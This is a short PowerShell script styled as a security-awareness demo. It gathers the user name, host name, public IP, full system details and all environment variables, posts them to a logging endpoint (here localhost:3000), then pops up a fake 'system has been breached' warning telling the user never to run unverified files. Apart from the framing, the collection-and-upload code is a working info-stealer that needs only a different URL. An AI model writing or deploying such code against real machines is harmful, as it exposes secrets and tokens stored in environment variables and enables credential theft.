# Function to Get Environment Variables
function Get-EnvironmentVariables {
    try {
        $envVars = Get-ChildItem env: | Select-Object Name, Value
        return $envVars
    } catch {
        Write-Error "Error retrieving environment variables: $_"
        return $null
    }
}

# Collect System Information
$systemInfo = @{
    User = $env:USERNAME
    Host = $env:COMPUTERNAME
    IPAddress = (Invoke-RestMethod -Uri "http://ipinfo.io/ip" -Method Get)
    ComputerInfo = Get-ComputerInfo
    ComputerVersionInfo = Get-ComputerInfo -Property "*version"
    EnvironmentVariables = Get-EnvironmentVariables
}

# Prepare Data for Sending
$data = @{
    SystemInfo = $systemInfo
    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
}

# Server Endpoint
$serverUrl = "http://localhost:3000/log"

# Send Data to the Server
try {
    Invoke-RestMethod -Uri $serverUrl -Method Post -Body ($data | ConvertTo-Json -Depth 10) -ContentType "application/json"
    Write-Host "Data sent to the server successfully."
} catch {
    Write-Error "Failed to send data to the server: $_"
}

# Display Educational Message
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
    "Your system has been breached!
Critical data has been sent to the attacker:
- User: $($systemInfo.User)
- Hostname: $($systemInfo.Host)
- Computer Info: $($systemInfo.ComputerInfo)
- Files: Your environment variables have also been logged!

Lesson: Never execute unverified files!",
    "Critical Security Breach",
    [System.Windows.MessageBoxButton]::OK,
    [System.Windows.MessageBoxImage]::Error
)

# Pause for Dramatic Effect
Start-Sleep -Seconds 30

# Exit Script
exit
